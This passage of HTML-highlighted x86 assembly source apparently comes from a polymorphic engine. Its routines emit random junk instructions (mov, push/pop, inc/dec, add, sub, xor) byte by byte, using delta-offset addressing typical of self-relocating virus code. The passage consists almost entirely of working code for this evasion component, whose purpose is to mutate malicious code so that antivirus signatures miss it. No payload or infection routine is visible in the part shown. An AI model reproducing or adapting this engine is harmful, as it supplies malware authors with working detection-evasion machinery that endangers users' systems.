        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0f0h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">081h</span><span class="sc0">

        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_rnd32</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gengarbage</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">stosw</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">

        </span><span class="sc6">stosd</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">exitgen</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;       Generates random mov</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">genmov</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">getrndal</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">genmov</span><span class="sc0">

        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">111b</span><span class="sc0">                        </span><span class="sc1">; eax &lt;- al</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">pushtable</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc2">0h</span><span class="sc0">  </span><span class="sc1">;is the reg. pushed?</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">savetomov</span><span class="sc0">                               </span><span class="sc1">;yep</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">pushregister</span><span class="sc0">                    </span><span class="sc1">;first push</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gengarbage</span><span class="sc0">                      </span><span class="sc1">;generate some garbage</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">randommov</span><span class="sc0">                       </span><span class="sc1">;movs a value or register</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gengarbage</span><span class="sc0">                      </span><span class="sc1">;generate some garbage</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">popregister</span><span class="sc0">                     </span><span class="sc1">;and pop it</span><span class="sc0">

        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">exitgen</span><span class="sc0">

</span><span class="sc5">savetomov</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">randommov</span><span class="sc0">

        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">exitgen</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;       Generates random push</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">genpush</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">getrndal</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">genpush</span><span class="sc0">

        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">111b</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">pushregister</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gengarbage</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">popregister</span><span class="sc0">

        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">exitgen</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;       Generates random inc</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">geninc</span><span class="sc4">:</span><span class="sc0">                                         </span><span class="sc1">;40</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">getrndal</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">geninc</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">genincdec</span><span class="sc0">

        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">111b</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">pushtable</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc2">0h</span><span class="sc0">  </span><span class="sc1">;is the reg. pushed?</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">savetoinc</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">pushregister</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gengarbage</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">040h</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gengarbage</span><span class="sc0">

        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">040h</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">popregister</span><span class="sc0">

        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">exitgen</span><span class="sc0">

</span><span class="sc5">savetoinc</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">040h</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">exitgen</span><span class="sc0">

</span><span class="sc5">genincdec</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                          </span><span class="sc1">;inc</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gengarbage</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">                            </span><span class="sc1">;dec</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">

        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">exitgen</span><span class="sc0">


</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;       Generates random dec</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">gendec</span><span class="sc4">:</span><span class="sc0">                                         </span><span class="sc1">;48</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">getrndal</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">gendec</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">gendecinc</span><span class="sc0">

        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">111b</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">pushtable</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc2">0h</span><span class="sc0">  </span><span class="sc1">;is the reg. pushed?</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">savetodec</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">pushregister</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gengarbage</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">048h</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gengarbage</span><span class="sc0">

        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">048h</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">popregister</span><span class="sc0">

        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">exitgen</span><span class="sc0">

</span><span class="sc5">savetodec</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">048h</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">exitgen</span><span class="sc0">

</span><span class="sc5">gendecinc</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">48h</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gengarbage</span><span class="sc0">

        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">8h</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">exitgen</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;       Pushes register in al</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">pushregister</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">pushtable</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;set flag for reg.</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">050h</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;       Pops register in al</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">popregister</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">pushtable</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;unflag for reg.</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">058h</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;       Generates random add reg, value or add reg1,reg2 - reg = al</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">randomadd</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_rnd32</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">addregreg</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">randomaddvalue</span><span class="sc0">

</span><span class="sc5">rndaddb</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">addregreg</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">randomaddreg</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">rndaddb</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">


</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;       Generates random add reg,value - reg = al</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">


</span><span class="sc1">;           81 c0+reg value</span><span class="sc0">
</span><span class="sc1">; reg = eax 05 value</span><span class="sc0">

</span><span class="sc5">randomaddvalue</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                                   </span><span class="sc1">;reg = eax?</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">addeax</span><span class="sc0">                                  </span><span class="sc1">;special</span><span class="sc0">

        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">081h</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0c0h</span><span class="sc0">

        </span><span class="sc6">stosw</span><span class="sc0">

</span><span class="sc5">backfromaddeax</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_rnd32</span><span class="sc0">

        </span><span class="sc6">stosd</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">addeax</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">05h</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">backfromaddeax</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;       Generates random add reg1,reg2 - reg1 = al </span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">randomaddreg</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">getrndal</span><span class="sc0">

        </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">

        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">bl</span><span class="sc0">                                   </span><span class="sc1">;mix instructions</span><span class="sc0">
        
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0c0h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">

        </span><span class="sc6">stosw</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">


</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;       Generates random sub reg, value or sub reg1,reg2 - reg = al</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">randomsub</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_rnd32</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">subregreg</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">randomsubvalue</span><span class="sc0">

</span><span class="sc5">rndsubb</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">subregreg</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">randomsubreg</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">rndsubb</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">


</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;       Generates random sub reg,value - reg = al</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">


</span><span class="sc1">;           81 c0+reg value</span><span class="sc0">
</span><span class="sc1">; reg = eax 05 value</span><span class="sc0">

</span><span class="sc5">randomsubvalue</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                                   </span><span class="sc1">;reg = eax?</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">subeax</span><span class="sc0">                                  </span><span class="sc1">;special</span><span class="sc0">

        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">081h</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0e8h</span><span class="sc0">

        </span><span class="sc6">stosw</span><span class="sc0">

</span><span class="sc5">backfromsubeax</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_rnd32</span><span class="sc0">

        </span><span class="sc6">stosd</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">subeax</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">05h</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">backfromsubeax</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;       Generates random sub reg1,reg2 - reg1 = al </span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">randomsubreg</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">getrndal</span><span class="sc0">

        </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">

        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">bl</span><span class="sc0">                                   </span><span class="sc1">;mix instructions</span><span class="sc0">
        
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0c0h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">

        </span><span class="sc6">stosw</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">


</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;       Generates a xor reg, value or xor reg, reg2 - reg = al</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">randomxor</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_rnd32</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">xorvalue</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">randomxorreg</span><span class="sc0">

</span><span class="sc5">rndxorr</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">xorvalue</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">randomxorvalue</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">rndxorr</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">


</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;       Generates a random xor reg,reg2 - reg = al</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">randomxorreg</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                                     </span><span class="sc1">;6633</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">getrndal</span><span class="sc0">

        </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">

        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">bl</span><span class="sc0">                                   </span><span class="sc1">;mix instructions</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0c0h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">033h</span><span class="sc0">

        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">

        </span><span class="sc6">stosw</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">


</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;       Generates a random xor reg,value</span><span class="sc0">
</span><span class="sc1">;-----------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">randomxorvalue</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0f0h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">081h</span><span class="sc0">
        
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">

        </span><span class="sc6">stosw</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_rnd32</span><span class="sc0">

        </span><span class="sc6">stosd</span><span class="sc0">

